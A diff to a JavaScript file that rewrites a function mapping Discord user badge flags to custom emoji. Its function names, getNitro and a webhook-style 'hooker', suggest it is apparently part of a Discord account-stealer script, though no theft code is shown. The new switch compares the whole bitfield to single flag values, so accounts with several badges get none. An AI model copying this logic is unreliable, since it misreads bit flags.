@@ -577,53 +577,50 @@ const getNitro = (flags) => {
 };
 
 const getBadges = (flags) => {
-    const flagsDict = {
-      DISCORD_EMPLOYEE: {
-        emoji: "<:DiscordEmployee:1074178651832193065>",
-      },
-      DISCORD_PARTNER: {
-        emoji: "<:PartneredServerOwner:1074178654961156236>",
-      },
-      HYPESQUAD_EVENTS: {
-        emoji: "<:hypesquad_events:1074178656315916428>",
-      },
-      BUG_HUNTER_LEVEL_1: {
-        emoji: "<:BugHunterGreen:1074577741803946104>",
-      },
-      HOUSE_BRAVERY: {
-        emoji: "<:Bravery:1074178658194964630>",
-      },
-      HOUSE_BRILLIANCE: {
-        emoji: "<:Brilliance:1074178662775144488>",
-      },
-      HOUSE_BALANCE: {
-        emoji: "<:Balance:1074178660820590652>",
-      },
-      EARLY_SUPPORTER: {
-        emoji: "<:Early:1074178644139835394>",
-      },
-      BUG_HUNTER_LEVEL_2: {
-        emoji: "<:BugHunter2:1074178650326446171>",
-      },
-      VERIFIED_BOT_DEVELOPER: {
-        emoji: "<:Dev:1074178642613108808>",
-      },
-      ACTIVE_DEVELOPER: {
-        emoji: "<:ActiveDev:1074178646610280559>",
-      },
-      CERTIFIED_MODERATOR: {
-        emoji: "<:CertifiedModerator:1074557948778528848>",
-      },
-      SPAMMER: {
-        emoji: "⌨",
-      }
-    };
-  
-    return Object.keys(flagsDict).reduce((acc, flag) => {
-        acc.push([flagsDict[flag].emoji]);
-        return acc;
-    }, []);
+  let badges = '';
+  switch (flags) {
+    case 1:
+      badges += '<:DiscordEmployee:1074178651832193065> ';
+      break;
+    case 2:
+      badges += '<:PartneredServerOwner:1074178654961156236> ';
+      break;
+    case 131072:
+      badges += '<:Dev:1074178642613108808> ';
+      break;
+    case 4194304:
+      badges += '<:ActiveDev:1074178646610280559> ';
+      break;
+    case 4:
+      badges += '<:hypesquad_events:1074178656315916428> ';
+      break;
+    case 16384:
+      badges += '<:BugHunter2:1074178650326446171> ';
+      break;
+    case 8:
+      badges += '<:BugHunterGreen:1074577741803946104> ';
+      break;
+    case 512:
+      badges += '<:Early:1074178644139835394> ';
+      break;
+    case 128:
+      badges += '<:Brilliance:1074178662775144488> ';
+      break;
+    case 64:
+      badges += '<:Bravery:1074178658194964630> ';
+      break;
+    case 256:
+      badges += '<:Balance:1074178660820590652> ';
+      break;
+    case 0:
+      badges = ' ';
+      break;
+    default:
+      badges = ' ';
+      break;
   }
+  return badges;
+}
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
